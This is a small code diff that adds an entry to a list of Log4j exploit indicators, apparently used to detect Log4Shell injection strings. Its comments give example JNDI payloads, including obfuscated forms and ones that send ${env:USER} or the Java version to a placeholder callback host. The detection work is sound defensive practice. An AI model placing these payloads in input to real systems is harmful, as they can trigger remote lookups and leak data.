@@ -781,6 +781,7 @@ LOG4J_EXPLOIT_IOCS = {
     "jndi:corba:/",
     "jndi:iiop:/",
     "jndi:${",
+    "${jndi:", # breadth
     "${lower:", # example: ${jn${lower:d}i:l${lower:d}ap://example.${lower:c}om:1234/callback}
     "${env:", # example: ${jndi:ldap://example.com:1234/callback/${env:USER}
     "${sys:", # example: ${jndi:ldap://example.com:1234/callback/${sys:java.version}
